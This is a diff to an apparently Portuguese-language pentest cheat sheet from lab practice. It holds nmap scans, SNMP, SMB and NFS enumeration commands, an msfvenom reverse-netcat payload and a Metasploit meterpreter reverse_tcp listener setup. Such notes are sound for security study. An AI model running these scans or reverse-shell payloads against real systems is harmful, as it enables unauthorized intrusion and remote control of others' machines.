@@ -59,11 +59,17 @@ Comando: `nmap -sn -PE 10.10.1.0/24`
 Comando: `for ip in {2..254}; do (ping -c 1 192.168.200.${ip} | grep "bytes from" &);done`
 
 `nmap -Pn -p88 -sV -O 192.168.2.37`
+
 nmap -Pn -sS -T5  -p-
+
 nmap -Pn -sS -T5 -p389
+
 nmap -Pn -p80
+
 nmap -sV -A -p80
+
 nmap -sVC -A -p- -T5
+
 nmap -Pn -sS -sV -p- -iL hosts
 
 **Separando somente os endereços IP**
@@ -138,15 +144,20 @@ Comando: `host -l <dns> <dns>`
 
 **SNMP**
 locate *.nse | grep snmp
+
 nmap -sU -p 161 192.168.10.103 --scrip=snmp-win32-shares.nse
+
 nmap -sU -p 161 192.168.10.103 --script=snmp-win32-users.nse
+
 snmp-check 192.168.10.103
 
 **DNS**
 desafio 192.168.10.100
 
 **NFS**
+
 showmount -e 192.168.10.159
+
 mount -t nfs 192.168.10.159:/home/vulnix /tmp/eder cd /tmp/eder
 
 **FTP**
@@ -158,7 +169,9 @@ svmap 192.168.10.0/24
 
 **SMB**
 nmap -sU -p 161 192.168.10.103 --script=snmp-win32-users.nse
+
 nbtscan -r 192.168.10.0/24
+
 crackmapexec smb ip/24
 
 
@@ -186,9 +199,13 @@ msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=4244
 
 **Colocando a máquina para escutar**
 use exploit/multi/handler
+
 set payload windows/meterpreter/reverse_tcp
+
 set lhost 10.10.10.2
+
 set lport 4321
+
 exploit
 
 getuid
